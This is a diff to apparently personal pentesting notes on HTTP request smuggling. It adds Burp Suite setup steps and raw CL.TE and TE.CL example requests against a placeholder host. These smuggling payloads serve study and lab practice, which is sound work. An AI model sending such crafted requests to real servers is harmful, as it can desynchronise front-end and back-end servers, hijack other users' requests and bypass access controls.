@@ -48,20 +48,15 @@ Since HTTP/1 has two differents methods for specifyng the length of HTTP message
 
 # Burpuiste Setup for smuggling attacks
 
-At first we need to download `` burp extension may be we can use it.
+At first we need to download `HTTP Request Smuggler` burp extension may be we can use it. It has a usefull scanner.
 
 We should do this on every request on the repeater tab.
 
 1. Downgrade the protocol to HTTP/1.1.
-
 ![HTTP Request Smuggling](/hackingnotes/images/smuggling-downgrade.png)
-
 2. Disable `Update Content-Length`
-
 ![HTTP Request Smuggling](/hackingnotes/images/smuggling-update.png)
-
 3. Turn on `Non printable characters`
-
 ![HTTP Request Smuggling](/hackingnotes/images/smuggling-linebreak.png)
 
 # CL.TE
@@ -74,11 +69,29 @@ Host: vulnerable-website.com
 Content-Length: 13
 Transfer-Encoding: chunked
 
-0
-
+0\r\n
+\r\n
 SMUGGLED
+
 ```
 
 ![HTTP Request Smuggling](/hackingnotes/images/smuggling-clte.png)
 
 # TE.CL
+
+The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. We can perform a simple HTTP request smuggling attack as follows: 
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8\r\n
+SMUGGLED\r\n
+0\r\n
+\r\n
+
+```
+
+![HTTP Request Smuggling](/hackingnotes/images/smuggling-tecl.png)
